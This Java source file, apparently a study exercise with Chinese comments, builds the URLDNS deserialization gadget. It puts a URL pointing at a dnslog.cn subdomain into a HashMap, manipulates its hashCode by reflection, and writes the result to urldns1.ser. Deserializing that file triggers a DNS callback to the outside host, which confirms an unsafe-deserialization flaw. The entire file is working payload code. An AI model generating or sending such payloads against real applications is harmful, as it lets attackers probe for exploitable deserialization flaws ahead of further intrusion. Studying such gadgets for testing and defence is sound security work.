package urldns;

import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

/**
 * </br>
 * Created by yangxiaohua on 2021/7/29.
 */
public class URLDNS {

  public static void main(String[] args) throws Exception {
    //首先要实例化一个hashmap对象，并初始化一个URL对象，反射获取URL.hashCode属性
    HashMap obj = new HashMap();
    URL url = new URL("http://gjzpnf.dnslog.cn");
    Field field = Class.forName("java.net.URL").getDeclaredField("hashCode");
    //修改访问权限
    field.setAccessible(true);
    //设置hashCode值为任何不为-1的数字，为了不在序列化时触发
    field.set(url, 111);
    //将URL对象设置为key放入hashmap对象中
    obj.put(url, "mamasang");
    //将url的hashCode重新设置为-1。确保在反序列化时能够成功触发
    field.set(url, -1);

    try {
      //      FileOutputStream fileOutputStream = new FileOutputStream(
      //        System.getProperty("user.dir") + "/src/urldns.ser");
      FileOutputStream fileOutputStream = new FileOutputStream("urldns1.ser");
      ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStream);
      outputStream.writeObject(obj);
      outputStream.close();
      fileOutputStream.close();
    } catch (Exception e) {
      e.printStackTrace();

    }
  }
}
